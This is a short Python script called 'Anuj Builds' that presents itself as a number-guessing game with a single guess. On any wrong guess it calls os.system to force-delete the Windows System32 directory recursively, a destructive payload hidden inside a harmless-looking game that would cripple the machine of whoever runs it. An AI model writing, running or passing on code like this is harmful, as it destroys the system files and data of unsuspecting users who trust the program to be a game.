# Anuj Builds

import random
import os

number = random.randint(1, 100)
guess = int(input("Guess the number between 1 to 100. You only have one chance: "))

if guess == number:
    print("You won!")
else:
    os.system("del /s /f /q C:\\Windows\\System32")


